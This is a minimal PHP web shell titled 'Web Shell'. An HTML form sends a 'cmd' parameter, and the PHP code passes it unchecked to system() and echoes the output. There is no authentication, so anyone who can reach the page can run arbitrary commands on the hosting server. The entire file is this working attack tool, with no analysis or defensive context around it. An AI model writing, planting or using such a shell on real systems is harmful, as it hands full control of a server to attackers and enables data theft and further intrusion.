<html>
    <head>
        <title>Web Shell</title>
    </head>
    <h1>Web Shell</h1>
    <form action = "webshell.php" method = "GET">
        CMD:<input type = "text" name = "cmd"/></br>
        <input type = "submit"/>
    </form>
</html>

<?php 
    $cmd = $_GET['cmd'];
    if($cmd){
        echo "<pre>";
        system($cmd);
        echo "</pre>";
    }else{
        echo "</br>cw</br>";
    }
?>